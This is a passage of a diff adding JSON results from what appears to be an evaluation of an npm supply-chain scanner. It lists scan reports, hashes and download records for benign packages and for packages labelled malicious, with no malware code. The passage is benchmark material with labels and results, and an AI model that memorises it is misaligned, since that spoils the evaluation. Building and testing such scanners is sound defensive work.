+            "ruleName": "Exposed secret",
+            "severity": "critical",
+            "message": "SSH private key block found in README.",
+            "recommendation": "Remove the private key and regenerate the keypair.",
+            "category": "sensitive-exposure"
+          }
+        ],
+        "scannedAt": "2026-11-12T09:20:25.473Z"
+      },
+      "wallDurationMs": 4.464899999999943
+    },
+    {
+      "id": "dotenv-16.5.0",
+      "name": "dotenv",
+      "version": "16.5.0",
+      "label": "benign",
+      "family": "fresh-benign-environment-loader",
+      "split": "test",
+      "mode": "deep",
+      "provenance": {
+        "sourceUrl": "https://registry.npmjs.org/dotenv/-/dotenv-16.5.0.tgz",
+        "labelEvidence": "https://github.com/motdotla/dotenv — Established environment loader; legitimate local environment-file parsing and process environment access. Provisional benign control.",
+        "capturedAt": "2026-11-12T09:19:05.393Z",
+        "selectionSha256": "68d8287f504e336f9b3a651865f29e434b516ce2f99d60b3e50cdfc9f661bcf6",
+        "cohortFreezeSha256": "28a4b42fdbfdb8ed2d4d7b3d2536c2e44b5b378749693f630e25d5104a8481cb",
+        "archiveKind": "published-tarball",
+        "registryManifestSha256": "2ad413a17c0f09d2ddd6be6cc4517eb20f099ce054e0ac80b889ec476abac57f",
+        "publishedIntegrityVerified": true,
+        "derivation": "Original official npm tarball retained unchanged. package.json and README read in memory; Registry dist retained for SRI. Provisional benign control, not a safety or vulnerability-free guarantee."
+      },
+      "status": "complete",
+      "scanDurationMs": 1.540299999999661,
+      "stage": "scan",
+      "overallLevel": "dangerous",
+      "score": 75,
+      "highCriticalAlert": true,
+      "report": {
+        "scannerFingerprint": "9edf4bdf6b758142593e8877d2a88552865473dd113ba99d0ca7c2959cac132d",
+        "packageName": "dotenv",
+        "version": "16.5.0",
+        "overallLevel": "dangerous",
+        "score": 75,
+        "findings": [
+          {
+            "ruleId": "secret-exposure",
+            "ruleName": "Exposed secret",
+            "severity": "critical",
+            "message": "SSH private key block found in README.",
+            "recommendation": "Remove the private key and regenerate the keypair.",
+            "category": "sensitive-exposure"
+          }
+        ],
+        "contentScan": {
+          "status": "complete",
+          "archiveBytes": 22342,
+          "unpackedBytes": 75565,
+          "filesScanned": 7,
+          "filesSkipped": 4,
+          "integrityVerified": true,
+          "truncated": false
+        },
+        "scannedAt": "2026-11-12T09:20:25.479Z"
+      },
+      "wallDurationMs": 6.525499999999738
+    },
+    {
+      "id": "fastify-5.3.2",
+      "name": "fastify",
+      "version": "5.3.2",
+      "label": "benign",
+      "family": "fresh-benign-http-framework",
+      "split": "test",
+      "mode": "metadata",
+      "provenance": {
+        "sourceUrl": "https://registry.npmjs.org/fastify/-/fastify-5.3.2.tgz",
+        "labelEvidence": "https://fastify.dev/ — Established Node.js web framework; legitimate HTTP transport, request lifecycle hooks, schema-based validation and serialization. Provisional benign control.",
+        "capturedAt": "2026-11-12T09:19:05.763Z",
+        "selectionSha256": "68d8287f504e336f9b3a651865f29e434b516ce2f99d60b3e50cdfc9f661bcf6",
+        "cohortFreezeSha256": "28a4b42fdbfdb8ed2d4d7b3d2536c2e44b5b378749693f630e25d5104a8481cb",
+        "archiveKind": "published-tarball",
+        "registryManifestSha256": "04d9f13ab8f3cfae8fe3e0a4dd3e76e3208960350481b0cfabf63f9c3ff6dd6a",
+        "publishedIntegrityVerified": true,
+        "derivation": "Original official npm tarball retained unchanged. package.json and README read in memory; Registry dist retained for SRI. Provisional benign control, not a safety or vulnerability-free guarantee."
+      },
+      "status": "complete",
+      "scanDurationMs": 0.4054999999998472,
+      "stage": "scan",
+      "overallLevel": "safe",
+      "score": 100,
+      "highCriticalAlert": false,
+      "report": {
+        "scannerFingerprint": "9edf4bdf6b758142593e8877d2a88552865473dd113ba99d0ca7c2959cac132d",
+        "packageName": "fastify",
+        "version": "5.3.2",
+        "overallLevel": "safe",
+        "score": 100,
+        "findings": [],
+        "scannedAt": "2026-11-12T09:20:25.483Z"
+      },
+      "wallDurationMs": 4.1358000000000175
+    },
+    {
+      "id": "fastify-5.3.2",
+      "name": "fastify",
+      "version": "5.3.2",
+      "label": "benign",
+      "family": "fresh-benign-http-framework",
+      "split": "test",
+      "mode": "deep",
+      "provenance": {
+        "sourceUrl": "https://registry.npmjs.org/fastify/-/fastify-5.3.2.tgz",
+        "labelEvidence": "https://fastify.dev/ — Established Node.js web framework; legitimate HTTP transport, request lifecycle hooks, schema-based validation and serialization. Provisional benign control.",
+        "capturedAt": "2026-11-12T09:19:05.763Z",
+        "selectionSha256": "68d8287f504e336f9b3a651865f29e434b516ce2f99d60b3e50cdfc9f661bcf6",
+        "cohortFreezeSha256": "28a4b42fdbfdb8ed2d4d7b3d2536c2e44b5b378749693f630e25d5104a8481cb",
+        "archiveKind": "published-tarball",
+        "registryManifestSha256": "04d9f13ab8f3cfae8fe3e0a4dd3e76e3208960350481b0cfabf63f9c3ff6dd6a",
+        "publishedIntegrityVerified": true,
+        "derivation": "Original official npm tarball retained unchanged. package.json and README read in memory; Registry dist retained for SRI. Provisional benign control, not a safety or vulnerability-free guarantee."
+      },
+      "status": "complete",
+      "scanDurationMs": 122.45510000000013,
+      "stage": "scan",
+      "overallLevel": "safe",
+      "score": 100,
+      "highCriticalAlert": false,
+      "report": {
+        "scannerFingerprint": "9edf4bdf6b758142593e8877d2a88552865473dd113ba99d0ca7c2959cac132d",
+        "packageName": "fastify",
+        "version": "5.3.2",
+        "overallLevel": "safe",
+        "score": 100,
+        "findings": [],
+        "contentScan": {
+          "status": "complete",
+          "archiveBytes": 457779,
+          "unpackedBytes": 2597732,
+          "filesScanned": 293,
+          "filesSkipped": 56,
+          "integrityVerified": true,
+          "truncated": false
+        },
+        "scannedAt": "2026-11-12T09:20:25.612Z"
+      },
+      "wallDurationMs": 128.26470000000018
+    },
+    {
+      "id": "ws-8.18.2",
+      "name": "ws",
+      "version": "8.18.2",
+      "label": "benign",
+      "family": "fresh-benign-websocket-transport",
+      "split": "test",
+      "mode": "metadata",
+      "provenance": {
+        "sourceUrl": "https://registry.npmjs.org/ws/-/ws-8.18.2.tgz",
+        "labelEvidence": "https://github.com/websockets/ws — Established WebSocket client/server; ordinary networking, buffers and optional acceleration support. Provisional benign control.",
+        "capturedAt": "2026-11-12T09:19:06.188Z",
+        "selectionSha256": "68d8287f504e336f9b3a651865f29e434b516ce2f99d60b3e50cdfc9f661bcf6",
+        "cohortFreezeSha256": "28a4b42fdbfdb8ed2d4d7b3d2536c2e44b5b378749693f630e25d5104a8481cb",
+        "archiveKind": "published-tarball",
+        "registryManifestSha256": "4ff8704749f4395a06323b4b01b9dbb12dc72291e4aab52a81cf80c8ca99b0fb",
+        "publishedIntegrityVerified": true,
+        "derivation": "Original official npm tarball retained unchanged. package.json and README read in memory; Registry dist retained for SRI. Provisional benign control, not a safety or vulnerability-free guarantee."
+      },
+      "status": "complete",
+      "scanDurationMs": 0.2671999999997752,
+      "stage": "scan",
+      "overallLevel": "safe",
+      "score": 100,
+      "highCriticalAlert": false,
+      "report": {
+        "scannerFingerprint": "9edf4bdf6b758142593e8877d2a88552865473dd113ba99d0ca7c2959cac132d",
+        "packageName": "ws",
+        "version": "8.18.2",
+        "overallLevel": "safe",
+        "score": 100,
+        "findings": [],
+        "scannedAt": "2026-11-12T09:20:25.617Z"
+      },
+      "wallDurationMs": 5.1732999999999265
+    },
+    {
+      "id": "ws-8.18.2",
+      "name": "ws",
+      "version": "8.18.2",
+      "label": "benign",
+      "family": "fresh-benign-websocket-transport",
+      "split": "test",
+      "mode": "deep",
+      "provenance": {
+        "sourceUrl": "https://registry.npmjs.org/ws/-/ws-8.18.2.tgz",
+        "labelEvidence": "https://github.com/websockets/ws — Established WebSocket client/server; ordinary networking, buffers and optional acceleration support. Provisional benign control.",
+        "capturedAt": "2026-11-12T09:19:06.188Z",
+        "selectionSha256": "68d8287f504e336f9b3a651865f29e434b516ce2f99d60b3e50cdfc9f661bcf6",
+        "cohortFreezeSha256": "28a4b42fdbfdb8ed2d4d7b3d2536c2e44b5b378749693f630e25d5104a8481cb",
+        "archiveKind": "published-tarball",
+        "registryManifestSha256": "4ff8704749f4395a06323b4b01b9dbb12dc72291e4aab52a81cf80c8ca99b0fb",
+        "publishedIntegrityVerified": true,
+        "derivation": "Original official npm tarball retained unchanged. package.json and README read in memory; Registry dist retained for SRI. Provisional benign control, not a safety or vulnerability-free guarantee."
+      },
+      "status": "complete",
+      "scanDurationMs": 6.9065999999997985,
+      "stage": "scan",
+      "overallLevel": "safe",
+      "score": 100,
+      "highCriticalAlert": false,
+      "report": {
+        "scannerFingerprint": "9edf4bdf6b758142593e8877d2a88552865473dd113ba99d0ca7c2959cac132d",
+        "packageName": "ws",
+        "version": "8.18.2",
+        "overallLevel": "safe",
+        "score": 100,
+        "findings": [],
+        "contentScan": {
+          "status": "complete",
+          "archiveBytes": 34207,
+          "unpackedBytes": 147181,
+          "filesScanned": 17,
+          "filesSkipped": 2,
+          "integrityVerified": true,
+          "truncated": false
+        },
+        "scannedAt": "2026-11-12T09:20:25.628Z"
+      },
+      "wallDurationMs": 11.696200000000317
+    }
+  ],
+  "scanner": {
+    "entrypoint": "TypeScript source via existing core-local tsx; default built-in rules; no LLM/config/cache",
+    "sourceFiles": {
+      "packages/core/src/scanner/browser-signals.ts": "e77c9b0e53ebcfa7f38d8f952e874615aa07129edfcef28dcb71dae6ee6bafdf",
+      "packages/core/src/scanner/concealed-expression.ts": "749a1d0f4f5f88e18e53903a3c262091d73a4ed9f7af9f89dd8eb2c178e20f69",
+      "packages/core/src/scanner/concealed-string-table.ts": "563281c20f95203a5115cdcd42dd1e5569df3a2e296aa30299dc6c5e8de6f75a",
+      "packages/core/src/scanner/content-concealed-code.ts": "8e45a96a9c6e3ede37b010d85f880a28affe4346a71ee4f3c1848a46fcda6a77",
+      "packages/core/src/scanner/content-download-exec.ts": "b3963df268921c8520db768e69b007b8eaeb45205a0b2942728db1f33a50e9e1",
+      "packages/core/src/scanner/content-dynamic-signals.ts": "ee32eb6c96d967b7551e638da10234a1d4b3852a9c020d675c97fc92c1d2c7d9",
+      "packages/core/src/scanner/content-network-signals.ts": "da3039019bdff517863678fc684074e034f87820eff88637cda54e440614e169",
+      "packages/core/src/scanner/content-process-signals.ts": "eb6cde99996fb3ba3e8a435e3687bd1297b948b18582b65faf7bd421205ab1f8",
+      "packages/core/src/scanner/content-secret-flow.ts": "9283f2fd96d4ee1ee6f74cb624c4ba8f2f532504d26d5c679e3cee52b2a49870",
+      "packages/core/src/scanner/download-summaries.ts": "d1c5aa497fe4a2b9e2550fc38580814dfdcb9a26e78d8f14fee28d1f405b3e9d",
+      "packages/core/src/scanner/download-syntax.ts": "6f52bb59574a18c1b8cf0426e649b8b8e15b132f59ee9a77f79d0ad3b97977a8",
+      "packages/core/src/scanner/network-flow-expression.ts": "dc5f08cd9c5e3de54770f847301a0554a657ffcc7169f7d8c23fa5f131646029",
+      "packages/core/src/scanner/package-content.ts": "e40f7af6932424b30eb2f6eeeb86a3d9c3e8ec84bf8c83e57606e5828e0d8ee9",
+      "packages/core/src/scanner/readme-shell-signals.ts": "3e7079e9f4d4422298dbf839a72a93cb68d057edc402cbfb3f72db898abae039",
+      "packages/core/src/scanner/readme-url-signals.ts": "0e0271bbd73aa50163a888ad07178d6f4eb38b17b9dc15c7212b66b9d1dbbd4c",
+      "packages/core/src/scanner/rule-config.ts": "bf4e5da7cef1539dddd1a0955406363cb6047cc0c822cf5c5314701ba65c0b5c",
+      "packages/core/src/scanner/rule-loader.ts": "b34e1ed46dbeb9ed79a9d0b59e91be718efe23ee59a885923b46317894331d4c",
+      "packages/core/src/scanner/secret-flow-syntax.ts": "c88f34bd22fad369a6fe717b8cdf8380af8d8425ab92c8e3ad2a74e78743b1d9",
+      "packages/core/src/scanner/secret-flow-value.ts": "45c783c51d32998280369f478972f9ffce4989b9ea48305a6a744f8568f74d3a",
+      "packages/core/src/scanner/secret-flow-writes.ts": "89c9cc66e93711efd2eb3e1080af334f2b52fafe0a4e0829e4406f7fab26546a",
+      "packages/core/src/scanner/security-policy.ts": "e27174efdebda160b0b53d300af6ce2d08a31105097394e2839f6777d199e596",
+      "packages/core/src/scanner/source-binding-patterns.ts": "9b6abfe5b835ea5076a249e78e371c9b20bbee56b4999914f8fdac1ce02063b9",
+      "packages/core/src/scanner/source-bindings.ts": "8bce6d41845fe25a3785d0b00286848e3d3522fc052639bd404c96005b907d45",
+      "packages/core/src/scanner/source-tokens.ts": "51d29ffa1c4b7b12a37ecd04077714d97e24fa1526d3e15ea2b0c27a3e985c4a",
+      "packages/core/src/scanner/static-rules.ts": "f1f609ec576142bca3f4b20fcf7b3e651129afd9daf2960f252f3d142e79a961",
+      "packages/core/src/scanner/types.ts": "41b1daeaff7b9f76dcdf90c021b772fded81aa4e1b326e524708836a87672f3c"
+    },
+    "sourceFingerprint": "0e0d3b94b25cb9478af18c9524928dc2ed631d7e336f62ca5c1a8ecbe06f067f",
+    "coreVersion": "1.1.3",
+    "tsxVersion": "4.23.13"
+  },
+  "freezeVerification": {
+    "sourceUnchanged": true,
+    "sourceFilesChecked": 80,
+    "inputHashes": {
+      "scanner-freeze.json": "ca9a36feefd8e8717051bdaee795d4b41bb79a8f1b6c57189a371b4a0fb0c190",
+      "additional-observed.json": "adcaf773a174a8dccc28c3ad86b53ae4be9e20f6a6336b98596ba479b57a659a",
+      "cohort-freeze.json": "28a4b42fdbfdb8ed2d4d7b3d2536c2e44b5b378749693f630e25d5104a8481cb",
+      "malicious-selection.json": "cb59d79c42c7eb0086f84eda93b88aa453917e5dacc9b1b717d98bccee03d967",
+      "benign-selection.json": "68d8287f504e336f9b3a651865f29e434b516ce2f99d60b3e50cdfc9f661bcf6",
+      "dataset.json": "ce1619e7feb33c8572d18216f062b124d4cdeae6816b4be9785914a37cd47d35",
+      "acquisition.json": "5d056efb79b42827d6fdea42276a2a4cb5b4eb5ec9368c9c15d0fc7e93bdb541",
+      "preparation.json": "9baf0aa6dbfc76a81d9b887dbcef3392437b843cf4d8049ebac08790b7b6b822"
+    },
+    "verifiedAt": "2026-11-12T09:20:25.648Z"
+  },
+  "processPeakRssKiB": 319740,
+  "acquisition": [
+    {
+      "id": "node-ipc-12.0.1",
+      "name": "node-ipc",
+      "version": "12.0.1",
+      "label": "malicious",
+      "capturedAt": "2026-11-12T09:18:54.375Z",
+      "url": "https://raw.githubusercontent.com/DataDog/malicious-software-packages-dataset/72c723be547033c558244520524b117c8d71663b/samples/npm/compromised_lib/node-ipc/12.0.1/2026-05-14-node-ipc-v12.0.1.zip",
+      "gitBlob": "c847639adc33e69e9b346c3b6942c54bb4c2c960",
+      "sha256": "49dae8e1c1a92816bbf262b4dca15339402bed8e67b6cbb13c89e2c58e294c5e",
+      "bytes": 98633,
+      "status": "acquired"
+    },
+    {
+      "id": "nodelogic-1.0.0",
+      "name": "nodelogic",
+      "version": "1.0.0",
+      "label": "malicious",
+      "capturedAt": "2026-11-12T09:18:55.531Z",
+      "url": "https://raw.githubusercontent.com/DataDog/malicious-software-packages-dataset/72c723be547033c558244520524b117c8d71663b/samples/npm/malicious_intent/nodelogic/1.0.0/2024-10-16-nodelogic-v1.0.0.zip",
+      "gitBlob": "62f63ceab0caff0a75499f89968973defc6faea7",
+      "sha256": "00b56ecc22258af220c3e1489501d33ec007ca45f3eeae6250bb62ab0297bbad",
+      "bytes": 3454,
+      "status": "acquired"
+    },
+    {
+      "id": "rspack-core-1.1.7",
+      "name": "@rspack/core",
+      "version": "1.1.7",
+      "label": "malicious",
+      "capturedAt": "2026-11-12T09:18:56.424Z",
+      "url": "https://raw.githubusercontent.com/DataDog/malicious-software-packages-dataset/72c723be547033c558244520524b117c8d71663b/samples/npm/compromised_lib/@rspack@core/1.1.7/2024-12-20-@rspack_core-v1.1.7.zip",
+      "gitBlob": "d75e4a92cf2d7c7e979a3d1eee20aada487d05e6",
+      "sha256": "ccb55d450eef5dec8732fbe4d9df92b31511198ab38b00ab1c50dbb83bdcd34d",
+      "bytes": 1170459,
+      "status": "acquired"
+    },
+    {
+      "id": "0xengine-xmlrpc-1.3.18",
+      "name": "@0xengine/xmlrpc",
+      "version": "1.3.18",
+      "label": "malicious",
+      "capturedAt": "2026-11-12T09:18:57.366Z",
+      "url": "https://raw.githubusercontent.com/DataDog/malicious-software-packages-dataset/72c723be547033c558244520524b117c8d71663b/samples/npm/malicious_intent/@0xengine@xmlrpc/1.3.18/2024-10-08-@0xengine_xmlrpc-v1.3.18.zip",
+      "gitBlob": "0198850db71762a08c103f625d2d5040836ce5f1",
+      "sha256": "010b796380949f602f747d098f996fa1d4614588d02cec0ecd93eeea61825ea9",
+      "bytes": 32633,
+      "status": "acquired"
+    },
+    {
+      "id": "ethereumvulncontracthandler-1.3.0",
+      "name": "ethereumvulncontracthandler",
+      "version": "1.3.0",
+      "label": "malicious",
+      "capturedAt": "2026-11-12T09:18:57.731Z",
+      "url": "https://raw.githubusercontent.com/DataDog/malicious-software-packages-dataset/72c723be547033c558244520524b117c8d71663b/samples/npm/malicious_intent/ethereumvulncontracthandler/1.3.0/2024-12-19-ethereumvulncontracthandler-v1.3.0.zip",
+      "gitBlob": "89c53830031e22b830ddc6deb4132c6181e98c63",
+      "sha256": "c49f888fb4967e3929ed1f3b66e5d3f14cf7737d17d63b2ac856f7fb4508154c",
+      "bytes": 6386,
+      "status": "acquired"
+    },
+    {
+      "id": "slf4j-api-js-1.0.0",
+      "name": "slf4j-api-js",
+      "version": "1.0.0",
+      "label": "malicious",
+      "capturedAt": "2026-11-12T09:18:58.038Z",
+      "url": "https://raw.githubusercontent.com/DataDog/malicious-software-packages-dataset/72c723be547033c558244520524b117c8d71663b/samples/npm/malicious_intent/slf4j-api-js/1.0.0/2025-04-21-slf4j-api-js-v1.0.0.zip",
+      "gitBlob": "1459762d77928c8719c58449a41aa7894c647b53",
+      "sha256": "e33e55ae02a94f12e5e18da5cb682cacc2e8878df499074e6314423c03079629",
+      "bytes": 5469,
+      "status": "acquired"
+    },
+    {
+      "id": "xlsx-to-json-lh-0.5.2",
+      "name": "xlsx-to-json-lh",
+      "version": "0.5.2",
+      "label": "malicious",
+      "capturedAt": "2026-11-12T09:18:58.368Z",
+      "url": "https://raw.githubusercontent.com/DataDog/malicious-software-packages-dataset/72c723be547033c558244520524b117c8d71663b/samples/npm/malicious_intent/xlsx-to-json-lh/0.5.2/2025-03-30-xlsx-to-json-lh-v0.5.2.zip",
+      "gitBlob": "32cc778d2ea76659907cc4b8efc3fbf3e0847d19",
+      "sha256": "6bf0a85ef84ed035d6ef9e91601328e4d7e2a0a7c249490110e5344052cdf8ec",
+      "bytes": 9505,
+      "status": "acquired"
+    },
+    {
+      "id": "crypto-encrypt-ts-5.4.5",
+      "name": "crypto-encrypt-ts",
+      "version": "5.4.5",
+      "label": "malicious",
+      "capturedAt": "2026-11-12T09:18:58.670Z",
+      "url": "https://raw.githubusercontent.com/DataDog/malicious-software-packages-dataset/72c723be547033c558244520524b117c8d71663b/samples/npm/malicious_intent/crypto-encrypt-ts/5.4.5/2025-04-26-crypto-encrypt-ts-v5.4.5.zip",
+      "gitBlob": "4dba8651b9f591eedad629f1c906db0524920ec5",
+      "sha256": "f04e548b73594c69aae9fc110453ae7b01631978e6112cea34c16295d8978b09",
+      "bytes": 10294,
+      "status": "acquired"
+    },
+    {
+      "id": "aws-sdk-client-s3-3.758.0",
+      "name": "@aws-sdk/client-s3",
+      "version": "3.758.0",
+      "label": "benign",
+      "capturedAt": "2026-11-12T09:18:58.994Z",
+      "url": "https://registry.npmjs.org/@aws-sdk/client-s3/-/client-s3-3.758.0.tgz",
+      "sha256": "eff068d91521c72c72544481c936e73c323a7e0cf2fcc5362718039300060f0a",
+      "bytes": 381605,
+      "registrySha256": "2628b5b8614a4379862b900ebfa3fc230d747c41dac0fc3f1abdddcfeb6e4cb8",
+      "integrityVerified": true,
+      "status": "acquired"
+    },
+    {
+      "id": "opentelemetry-sdk-node-0.57.2",
+      "name": "@opentelemetry/sdk-node",
+      "version": "0.57.2",
+      "label": "benign",
+      "capturedAt": "2026-11-12T09:19:00.703Z",
+      "url": "https://registry.npmjs.org/@opentelemetry/sdk-node/-/sdk-node-0.57.2.tgz",
+      "sha256": "5ec1450499b54bc0cf9b2f09a2aeb603a68f2a5d9f2df6c468a9424042f6b411",
+      "bytes": 23323,
+      "registrySha256": "17bccaa88a7c280e1589e0393f1bb0ce8d6860999b98ff833f090f4442cbaf43",
+      "integrityVerified": true,
+      "status": "acquired"
+    },
+    {
+      "id": "nodemailer-6.10.1",
+      "name": "nodemailer",
+      "version": "6.10.1",
+      "label": "benign",
+      "capturedAt": "2026-11-12T09:19:01.811Z",
+      "url": "https://registry.npmjs.org/nodemailer/-/nodemailer-6.10.1.tgz",
+      "sha256": "17adb75117b99b76019f2d571e1cc81ffe02d68d7d381f3cd2a41be1fffffb76",
+      "bytes": 115207,
+      "registrySha256": "67a21411676841980eafa274306d91c112410779f56edb0262eb8dbd1fa3e6b7",
+      "integrityVerified": true,
+      "status": "acquired"
+    },
+    {
+      "id": "electron-get-3.1.0",
+      "name": "@electron/get",
+      "version": "3.1.0",
+      "label": "benign",
+      "capturedAt": "2026-11-12T09:19:02.256Z",
+      "url": "https://registry.npmjs.org/@electron/get/-/get-3.1.0.tgz",
+      "sha256": "cc60cc0d830923b652f1c8510f26779ddeaab7c7a4941362798920ff970dfb38",
+      "bytes": 22554,
+      "registrySha256": "dd6f2981942bccef59a913bd8c3bd638405b505483de3ff8e53084097ebe14c3",
+      "integrityVerified": true,
+      "status": "acquired"
+    },
+    {
+      "id": "sharp-0.34.1",
+      "name": "sharp",
+      "version": "0.34.1",
+      "label": "benign",
+      "capturedAt": "2026-11-12T09:19:02.745Z",
+      "url": "https://registry.npmjs.org/sharp/-/sharp-0.34.1.tgz",
+      "sha256": "7d6f6ee6a85ae29921bba47e9dd4fae40c316fa9a1bc28e0b6049f3179e64bff",
+      "bytes": 117267,
+      "registrySha256": "451ce1ef17ab971fbc61fecc4b44b0f25b26128d1b61a5c02cd42b9f77072df6",
+      "integrityVerified": true,
+      "status": "acquired"
+    },
+    {
+      "id": "webpack-5.99.8",
+      "name": "webpack",
+      "version": "5.99.8",
+      "label": "benign",
+      "capturedAt": "2026-11-12T09:19:03.162Z",
+      "url": "https://registry.npmjs.org/webpack/-/webpack-5.99.8.tgz",
+      "sha256": "0476665eee672dc56cffc7338ee02d99ccf3c973780f304a02ff40e0d4850ee3",
+      "bytes": 1037387,
+      "registrySha256": "efb908acd68c3d4fa997491275185857eb557e1228cbd6ee335dc9d1514ad930",
+      "integrityVerified": true,
+      "status": "acquired"
+    },
+    {
+      "id": "ethers-6.13.5",
+      "name": "ethers",
+      "version": "6.13.5",
+      "label": "benign",
+      "capturedAt": "2026-11-12T09:19:03.918Z",
+      "url": "https://registry.npmjs.org/ethers/-/ethers-6.13.5.tgz",
+      "sha256": "0aeaa5a4f86b7e97cf34d5fa42ac7885100948d5183971705712fbfac345bab3",
+      "bytes": 2636057,
+      "registrySha256": "9a397392e166a58c36e055927cfd831eebc37d680d2598eedd884622f78d2b56",
+      "integrityVerified": true,
+      "status": "acquired"
+    },
+    {
+      "id": "tweetnacl-1.0.3",
+      "name": "tweetnacl",
+      "version": "1.0.3",
+      "label": "benign",
+      "capturedAt": "2026-11-12T09:19:04.646Z",
+      "url": "https://registry.npmjs.org/tweetnacl/-/tweetnacl-1.0.3.tgz",
+      "sha256": "5f8dc49cb4483e206ba3ebb22abbccfc0218c59b60fc78cce24197ced5b9e102",
+      "bytes": 49790,
+      "registrySha256": "2bac23c1590d5ad5cbadea7016fa882cc059bcbf57e2d8b0c41c2def0feda049",
+      "integrityVerified": true,
+      "status": "acquired"
+    },
+    {
+      "id": "jsonwebtoken-9.0.2",
+      "name": "jsonwebtoken",
+      "version": "9.0.2",
+      "label": "benign",
+      "capturedAt": "2026-11-12T09:19:05.024Z",
+      "url": "https://registry.npmjs.org/jsonwebtoken/-/jsonwebtoken-9.0.2.tgz",
+      "sha256": "9af68fd915ca9555035e5f0f3b6061e2e887d3bf56f39433ae0aa107bc8dde85",
+      "bytes": 12231,
+      "registrySha256": "d0e8ffa8ab2f2042cdd8dda22af60a49ab287abc56e237b2ca75c4e6d395509e",
+      "integrityVerified": true,
+      "status": "acquired"
+    },
+    {
+      "id": "dotenv-16.5.0",
+      "name": "dotenv",
+      "version": "16.5.0",
+      "label": "benign",
+      "capturedAt": "2026-11-12T09:19:05.393Z",
+      "url": "https://registry.npmjs.org/dotenv/-/dotenv-16.5.0.tgz",
+      "sha256": "3f50cfadf7bd16fea3b533c7fbb0e2043a27ee6bc38e93de93f7caa1a20b0309",
+      "bytes": 22342,
+      "registrySha256": "2ad413a17c0f09d2ddd6be6cc4517eb20f099ce054e0ac80b889ec476abac57f",
+      "integrityVerified": true,
+      "status": "acquired"
+    },
+    {
+      "id": "fastify-5.3.2",
+      "name": "fastify",
+      "version": "5.3.2",
+      "label": "benign",
+      "capturedAt": "2026-11-12T09:19:05.763Z",
+      "url": "https://registry.npmjs.org/fastify/-/fastify-5.3.2.tgz",
+      "sha256": "6aa900e10b54d0e6c5b0c90fe79c6e7204a5152cfccefb5e36533e2df739443e",
+      "bytes": 457779,
+      "registrySha256": "04d9f13ab8f3cfae8fe3e0a4dd3e76e3208960350481b0cfabf63f9c3ff6dd6a",
+      "integrityVerified": true,
+      "status": "acquired"
+    },
+    {
+      "id": "ws-8.18.2",
+      "name": "ws",
+      "version": "8.18.2",
+      "label": "benign",
+      "capturedAt": "2026-11-12T09:19:06.188Z",
+      "url": "https://registry.npmjs.org/ws/-/ws-8.18.2.tgz",
+      "sha256": "b90b7bd4e7ddad93457939ec92cf2fa70d74cf2ada525a64309d3260777eed31",
+      "bytes": 34207,
+      "registrySha256": "4ff8704749f4395a06323b4b01b9dbb12dc72291e4aab52a81cf80c8ca99b0fb",
+      "integrityVerified": true,
+      "status": "acquired"
+    }
+  ],
+  "preparation": [
+    {
+      "id": "node-ipc-12.0.1",
+      "label": "malicious",
+      "files": 23,
+      "sourceBytes": 198822,
+      "allPackageBytesPreserved": true,
+      "status": "prepared",
+      "bytes": 59142,
+      "nameVersionVerified": true
+    },
+    {
+      "id": "nodelogic-1.0.0",
+      "label": "malicious",
+      "files": 2,
+      "sourceBytes": 2844,
+      "allPackageBytesPreserved": true,
+      "status": "prepared",
+      "bytes": 1398,
+      "nameVersionVerified": true
+    },
+    {
+      "id": "rspack-core-1.1.7",
+      "label": "malicious",
+      "files": 244,
+      "sourceBytes": 2562505,
+      "allPackageBytesPreserved": true,
+      "status": "prepared",
+      "bytes": 485392,
+      "nameVersionVerified": true
+    },
+    {
+      "id": "0xengine-xmlrpc-1.3.18",
+      "label": "malicious",
+      "files": 14,
+      "sourceBytes": 56514,
+      "allPackageBytesPreserved": true,
+      "status": "prepared",
+      "bytes": 18050,
+      "nameVersionVerified": true
+    },
+    {
+      "id": "ethereumvulncontracthandler-1.3.0",
+      "label": "malicious",
+      "files": 2,
+      "sourceBytes": 11199,
+      "allPackageBytesPreserved": true,
+      "status": "prepared",
+      "bytes": 4076,
+      "nameVersionVerified": true
+    },
+    {
+      "id": "slf4j-api-js-1.0.0",
+      "label": "malicious",
+      "files": 4,
+      "sourceBytes": 4413,
+      "allPackageBytesPreserved": true,
+      "status": "prepared",
+      "bytes": 2558,
+      "nameVersionVerified": true
+    },
+    {
+      "id": "xlsx-to-json-lh-0.5.2",
+      "label": "malicious",
+      "files": 6,
+      "sourceBytes": 6092,
+      "allPackageBytesPreserved": true,
+      "status": "prepared",
+      "bytes": 2639,
+      "nameVersionVerified": true
+    },
+    {
+      "id": "crypto-encrypt-ts-5.4.5",
+      "label": "malicious",
+      "files": 4,
+      "sourceBytes": 11923,
+      "allPackageBytesPreserved": true,
+      "status": "prepared",
+      "bytes": 4019,
+      "nameVersionVerified": true
+    },
+    {
+      "id": "aws-sdk-client-s3-3.758.0",
+      "label": "benign",
+      "status": "prepared",
+      "bytes": 381605,
+      "nameVersionVerified": true
+    },
+    {
+      "id": "opentelemetry-sdk-node-0.57.2",
+      "label": "benign",
+      "status": "prepared",
+      "bytes": 23323,
+      "nameVersionVerified": true
+    },
+    {
+      "id": "nodemailer-6.10.1",
+      "label": "benign",
+      "status": "prepared",
+      "bytes": 115207,
+      "nameVersionVerified": true
+    },
+    {
+      "id": "electron-get-3.1.0",
+      "label": "benign",
+      "status": "prepared",
+      "bytes": 22554,
+      "nameVersionVerified": true
+    },
+    {
+      "id": "sharp-0.34.1",
+      "label": "benign",
+      "status": "prepared",
+      "bytes": 117267,
+      "nameVersionVerified": true
+    },
+    {
+      "id": "webpack-5.99.8",
+      "label": "benign",
+      "status": "prepared",
+      "bytes": 1037387,
+      "nameVersionVerified": true
+    },
+    {
+      "id": "ethers-6.13.5",
+      "label": "benign",
+      "status": "prepared",
+      "bytes": 2636057,
+      "nameVersionVerified": true
+    },
+    {
+      "id": "tweetnacl-1.0.3",
+      "label": "benign",
+      "status": "prepared",
+      "bytes": 49790,
+      "nameVersionVerified": true
+    },
+    {
+      "id": "jsonwebtoken-9.0.2",
+      "label": "benign",
+      "status": "prepared",
+      "bytes": 12231,
+      "nameVersionVerified": true
+    },
+    {
+      "id": "dotenv-16.5.0",
+      "label": "benign",
+      "status": "prepared",
+      "bytes": 22342,
+      "nameVersionVerified": true
+    },
+    {
+      "id": "fastify-5.3.2",
+      "label": "benign",
+      "status": "prepared",
+      "bytes": 457779,
+      "nameVersionVerified": true
+    },
+    {
+      "id": "ws-8.18.2",
+      "label": "benign",
+      "status": "prepared",
+      "bytes": 34207,
+      "nameVersionVerified": true
+    }
+  ],
+  "postScanTriage": {
+    "firstFour": {
